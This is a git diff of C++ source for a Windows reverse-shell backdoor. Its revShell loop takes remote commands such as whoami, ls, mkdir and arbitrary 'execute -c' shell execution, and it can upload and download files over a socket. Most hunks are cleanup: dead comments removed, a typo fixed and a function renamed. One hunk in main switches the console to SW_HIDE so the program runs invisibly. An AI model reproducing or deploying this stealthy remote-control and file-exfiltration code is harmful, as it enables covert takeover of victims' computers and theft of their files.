@@ -34,24 +34,7 @@ std::vector<std::string> read_directory(std::string folder)
 	HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
 	if (hFind != INVALID_HANDLE_VALUE) {
 		do {
-			// read all (real) files in current folder
-
-			// , delete '!' read other 2 default folder . and ..
-			
-			//cout << fd.cFileName[0] << endl;
-			//cout << FILE_ATTRIBUTE_DIRECTORY << endl;		
-			//cout << (fd.dwFileAttributes | FILE_ATTRIBUTE_DIRECTORY) << endl;
-			/*if ((fd.dwFileAttributes | FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY 
-				&& (fd.cFileName[0] != '.')) 
-				names.push_back(fd.cFileName); 
-			
-			// if fd.dwFileAttributes
-
-		    if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
-				names.push_back(fd.cFileName);
-				*/
-			
-
+		
 			if (fd.cFileName[0] != '.') {
 
 				if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {	// it's a directory if true
@@ -158,8 +141,7 @@ void send_file(SOCKET tcp_sock, const char *filename) {
 	char sdbuf[LENGTH];			//1024
 	char buffer[256];	
 	int n;
-	//fgets(buffer, 255);
-	//memset(buffer, 0, sizeof(buffer));
+	
 
 	printf("Sending %s to the server...", filename);
 	if (FILE* fs2 = fopen(filename, "rb")) {
@@ -176,8 +158,6 @@ void send_file(SOCKET tcp_sock, const char *filename) {
 
 		::memset(sdbuf, 0, LENGTH);
 		int fs_block_sz;
-
-
 		while ((fs_block_sz = fread(sdbuf, sizeof(char), LENGTH, fs)) > 0) {
 			if (send(tcp_sock, sdbuf, fs_block_sz, 0) < 0) {
 				std::cout << "Error occurred while sending the file..." << std::endl;
@@ -187,11 +167,7 @@ void send_file(SOCKET tcp_sock, const char *filename) {
 				std::cout << "Sending..." << std::endl;
 			::memset(sdbuf, 0, LENGTH);
 		}
-
-
-
-		//cout << "File has been sent" << endl;
-		//Sleep(1000);
+		
 		shutdown(tcp_sock, 2);
 		closesocket(tcp_sock);
 	}
@@ -201,7 +177,6 @@ void send_file(SOCKET tcp_sock, const char *filename) {
 		closesocket(tcp_sock);
 	}
 
-	
 }
 
 std::string get_filename(std::string command) {
@@ -225,18 +200,14 @@ bool contains_cmd(std::string cmd, std::string word) {
 
 void get_file(SOCKET tr_sock, const char* filename) {
 	
-	std::cout << "Conected" << std::endl;
+	std::cout << "Connected" << std::endl;
 	Sleep(1500);
-
 	char rcvbuf[LENGTH];
-
 	std::fstream file;
 	file.open(filename, std::ios::out);
-
 	if (!file) {
 		send(tr_sock, "F", sizeof(char), 0);
 	}
-
 	FILE* fr = fopen(filename, "wb");
 	if (fr != NULL) {
 		send(tr_sock, "T", sizeof(char), 0);
@@ -256,11 +227,9 @@ void get_file(SOCKET tr_sock, const char* filename) {
 		if (fr_block_size < 0) {
 			std::cout << "Failed to receive..." << std::endl;
  		}
-
 		printf("File received...");
 		fclose(fr);
 	}
-
 }
 
 void mkdir(char* buffer, const char* file_name) {
@@ -292,7 +261,7 @@ std::string exec_terminal_cmd(std::string terminal_cmd) {
 	return ret;
 }
 
-void send_respond(SOCKET tcp_sock,const char* buffer, int buffer_length) {
+void send_response(SOCKET tcp_sock,const char* buffer, int buffer_length) {
 	
 	std::string length = std::to_string(buffer_length);
 	std::cout << length.length() << std::endl;
@@ -302,7 +271,6 @@ void send_respond(SOCKET tcp_sock,const char* buffer, int buffer_length) {
 
 	Sleep(2000);
 	send(tcp_sock, buffer, strlen(buffer) + 1, 0);
-
 }
 
 void revShell() {
@@ -337,10 +305,6 @@ void revShell() {
 			int m = 0;
 			if (strcmp(commandReceived, "whoami") == 0) {
 				std::cout << "Command parsed: whoami" << std::endl;
-				//std::cout << "Length of received command: " << result << std::endl;
-
-				//char buffer[257] = "";
-				//whoami(response_str.c_str());
 				whoami(buffer);
 				response_str = buffer;
 			}
@@ -386,18 +350,12 @@ void revShell() {
 			}
 			else if (strcmp(commandReceived, "sysinfo") == 0) {
 				std::cout << "Command parsed: sysinfo" << std::endl;
-				//getSystemInfo(buffer, 1000);
 			}
 			else if (strcmp(commandReceived, "ls") == 0) {
 				std::cout << "Command parsed: ls" << std::endl;
-					
 				response_str = get_ls();
-				//std::string str_respond = buffer;
-				//buffer = str_respond.c_str();
-				//send_respond(tcpsock, str_respond.c_str(), str_respond.length());
-				std::cout << response_str << std::endl;
-				//continue;
-					
+				
+				std::cout << response_str << std::endl;					
 			}
 			else if (contains_cmd(commandReceived, "mkdir")) {
 				std::cout << "Command parsed: mkdir" << std::endl;
@@ -409,10 +367,7 @@ void revShell() {
 				std::cout << "Command parsed: execute -c" << std::endl;
 				std::string terminal_cmd = command_str.substr(command_str.find("-c") + 2, command_str.length());
 				response_str = exec_terminal_cmd(terminal_cmd);
-				/*std::string respond = exec_terminal_cmd(terminal_cmd);
-				send_respond(tcpsock, respond.c_str(), respond.length());
-				memset(commandReceived, 0, DEFAULT_BUFLEN); 
-				continue;*/
+				
 			}
 			else if (contains_cmd(commandReceived, "execute")) {
 				std::cout << "Command parsed: execute" << std::endl;
@@ -435,7 +390,7 @@ void revShell() {
 
 			// strcat(buffer, "\n");
 			response_str += "\n";
-			send_respond(tcpsock, response_str.c_str(), response_str.length());
+			send_response(tcpsock, response_str.c_str(), response_str.length());
 			// send_respond(tcpsock, buffer, strlen(buffer) + 1);
 
 			//send(tcpsock, buffer, strlen(buffer) + 1, 0);
@@ -464,17 +419,12 @@ std::string execute_cmd() {
 }
 
 int main() {
-	//string ret = execute_cmd();
-	//cout << ret << endl;
-	//system("powershell ls");
-
-	SetCurrentDirectory("C:\\Users\\SESA559338\\Downloads");
 
 	HWND stealth;		// declare a windows handle
 	AllocConsole();		// allocate a new console
 	stealth = FindWindowA("ConsoleWindowClass", NULL);	// Find the previous Window handler and hide/show the 
 	// window depending upon the next command
-	ShowWindow(stealth, SW_SHOWNORMAL); // SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = hide the console
+	ShowWindow(stealth, SW_HIDE); // SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = hide the console
 
 	revShell();
 	return 0;
